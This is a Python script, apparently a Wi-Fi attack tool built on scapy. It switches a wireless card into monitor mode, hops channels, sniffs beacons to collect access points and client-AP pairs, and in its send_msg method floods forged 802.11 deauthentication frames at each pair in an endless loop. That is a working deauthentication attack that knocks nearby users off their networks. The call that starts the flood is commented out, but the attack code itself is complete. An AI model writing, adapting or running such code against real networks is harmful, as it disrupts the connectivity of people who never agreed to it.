import threading
import os, time 
import random 
from scapy.all import *
import windows
import observer

addresses = [] # transmitters 
AP = {} #Acces Points
ac_cli_pairs_channel = []
ftime = 20

#this should be a class
class Sniffer(observer.Subject):

    def __init__(self):
        self.channel = 13
        self.AP = dict()
        super().__init__()

    def send_msg(self,iface):

        CLI_AP_CHANNEL = []
            # for n in range(1,14):
        for ac_cli_ch in ac_cli_pairs_channel:
            
            dot11AP = Dot11(addr1=ac_cli_ch[1],addr2=ac_cli_ch[0], addr3=ac_cli_ch[0])
            dot11client = Dot11(addr1=ac_cli_ch[0],addr2=ac_cli_ch[1], addr3=ac_cli_ch[1])
            frameCLI = RadioTap()/dot11client/Dot11Deauth()
            frameAP = RadioTap()/dot11AP/Dot11Deauth()
            CLI_AP_CHANNEL.append((frameCLI,frameAP,ac_cli_ch[2]))
            # not correct format I guess

        print("START SENDING")
        import time
        while True:
            for CAC in CLI_AP_CHANNEL:
                # for r in range(-2,2):
                # print(f"channel: {CAC[2]}")
                
                # os.system('sudo iwconfig %s channel %d' % (iface,7))
                
                sendp(CAC[0], iface=iface,verbose=False)
                sendp(CAC[1], iface=iface,verbose=False)

                time.sleep(0.1)  


    def stopfilter(self,x):
        if stop_sniffer == True:
            return True

    def sniffer_thread(self,interface):
        global stop_sniffer
        stop_sniffer = False
        sniff(iface=interface, prn=self.findSSID, stop_filter = self.stopfilter)

    def findSSID(self,pkt):
        device=pkt.getlayer(Dot11)
        self.list_of_AP = []
        if device.addr2 not in addresses:
            addresses.append(device.addr2)
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt.getlayer(Dot11Elt).info
                # print(device.addr1,device.addr2,device.addr3,device.payload.name,ssid)
                self.AP[device.addr2] = ssid
                self.list_of_AP.append(ssid)
            else:
                ac_cli_pairs_channel.append((device.addr1,device.addr2,self.channel))
                
                # if device.addr1 in self.AP:
                    # print(self.AP[device.addr1],device.addr2,device.addr3,device.payload.name)
                # else: 
                    # print(device.addr1,device.addr2,device.addr3,device.payload.name)
        self._subject_state=self.list_of_AP
        self._notify()

    def hopper(self,interface):
        n = 1
        global stop_hopper
        stop_hopper = False
        while not stop_hopper:
            output =os.system('sudo iwconfig %s channel %d' % (interface, n))
            n = random.randint(1,13)
            if output == 0:
                self.channel = n
                time.sleep(0.5)

if __name__=="__main__":
    windows=windows.App()  
    sniffer=Sniffer() 
     # observing sniffer 
    interface = 'wlp3s0'
    os.system('sudo airmon-ng start %s' % (interface))
    interface += 'mon'

    threadWin = threading.Thread(target=windows.wapper_thread, args=(interface, ), name="windows") 
    threadWin.daemon = True
    threadWin.start()

    sniffer.attach(windows.DetectedNetworksWin)

    thread1 = threading.Thread(target=sniffer.hopper, args=(interface, ), name="hopper")
    thread1.daemon = True
    thread1.start()

    thread2 = threading.Thread(target=sniffer.sniffer_thread,args=(interface, ), name="sniffer")
    thread2.daemon = True
    thread2.start()

    while True:
        pass
    # stime = time.time()
    # ctime = 0
    # while ctime < ftime:
    #     ctime = time.time()-stime

    # print("stopping sniffer")
    # stop_sniffer = True
    # thread2.join()
    # print("sniffer stopped")

    # print("stopping hopper")
    # stop_hopper = True
    # thread1.join()
    # print("hopper stopped")

    # snif.send_msg(interface)
    